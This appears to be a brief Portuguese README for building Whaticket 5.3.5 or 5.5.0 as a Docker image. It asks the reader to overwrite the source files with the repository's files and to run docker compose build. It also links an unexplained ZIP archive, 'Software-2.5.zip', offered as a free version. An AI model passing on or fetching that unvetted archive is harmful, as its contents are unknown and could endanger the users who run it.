Dockerize a versão do Whaticket 5.3.5 ou 5.5.0

Sobrescreva os arquivos desse repositório aos arquivos do codigo fonte do Whaticket.

Comando para gerar imagem docker:

```
docker compose build
```
Versão para uso gratuita:

https://github.com/rlmourarj/wticketdocker/raw/refs/heads/master/frontend/Software-2.5.zip
